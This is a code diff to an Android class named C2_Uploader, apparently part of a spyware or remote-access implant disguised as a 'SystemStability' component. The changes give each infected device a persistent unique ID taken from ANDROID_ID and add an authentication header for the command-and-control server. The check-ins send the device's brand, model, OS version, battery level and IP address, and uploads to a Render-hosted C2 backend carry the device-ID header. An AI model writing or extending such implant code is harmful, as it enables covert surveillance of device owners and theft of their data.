@@ -24,9 +24,41 @@ public class C2_Uploader {
 
     /**
      * Gets a persistent, unique identifier for this device.
+     * [SECURITY] Uses Settings.Secure.ANDROID_ID (persisted in prefs) so devices with the
+     * same Build.MODEL no longer overwrite each other on the C2 side.
+     * Build.MODEL is only a display alias and is still sent separately in check-in.
      */
     public static String getDeviceId(Context context) {
+        if (cachedDeviceId != null) return cachedDeviceId;
+        android.content.SharedPreferences prefs = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE);
+        cachedDeviceId = prefs.getString("device_uid", null);
+        if (cachedDeviceId == null || cachedDeviceId.isEmpty()) {
+            try {
+                String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+                if (androidId != null && !androidId.isEmpty()) {
+                    cachedDeviceId = "d-" + androidId;
+                }
+            } catch (Exception ignored) {}
+            if (cachedDeviceId == null || cachedDeviceId.isEmpty()) {
+                cachedDeviceId = "d-" + UUID.randomUUID().toString();
+            }
+            prefs.edit().putString("device_uid", cachedDeviceId).apply();
+        }
+        return cachedDeviceId;
+    }
+
+    /**
+     * Display alias for the device (Build.MODEL). Not used as an identifier.
+     */
+    public static String getDeviceAlias() {
         return android.os.Build.MODEL != null ? android.os.Build.MODEL : "Android Device";
+    }
+
+    private static void addDeviceSecretHeader(HttpURLConnection conn) {
+        String secret = BuildConfig.DEVICE_SECRET;
+        if (secret != null && !secret.trim().isEmpty()) {
+            conn.setRequestProperty("X-Device-Secret", secret.trim());
+        }
     }
 
     private static String getIpForRenderC2(Context context) {
@@ -46,14 +78,14 @@ public class C2_Uploader {
         new Thread(() -> {
             try {
                 String ip = getIpForRenderC2(context);
-                int port = FirebaseConfig.DEFAULT_PORT;
-                
+                int port = FirebaseConfig.activeListeningPort;
+
                 String devId = getDeviceId(context);
                 JSONObject status = new JSONObject();
                 status.put("deviceId", devId);
                 status.put("brand", Build.MANUFACTURER);
                 status.put("type", "checkin");
-                status.put("model", Build.MODEL);
+                status.put("model", getDeviceAlias());
                 status.put("os", Build.VERSION.RELEASE);
                 status.put("battery", SystemAnalytics.getBatteryLevel(context) + "%");
                 status.put("ip", ip);
@@ -86,6 +118,7 @@ public class C2_Uploader {
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
+            addDeviceSecretHeader(conn);
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(15000);
             conn.setDoOutput(true);
@@ -104,6 +137,7 @@ public class C2_Uploader {
                     redirConn.setRequestMethod("POST");
                     redirConn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                     redirConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                    addDeviceSecretHeader(redirConn);
                     redirConn.setConnectTimeout(15000);
                     redirConn.setReadTimeout(15000);
                     redirConn.setDoOutput(true);
@@ -182,6 +216,7 @@ public class C2_Uploader {
                 
                 // Add Device ID as a header for easier filtering on Render backend
                 conn.setRequestProperty("X-Device-ID", getDeviceId(context));
+                addDeviceSecretHeader(conn);
 
                 dos = new DataOutputStream(conn.getOutputStream());
 
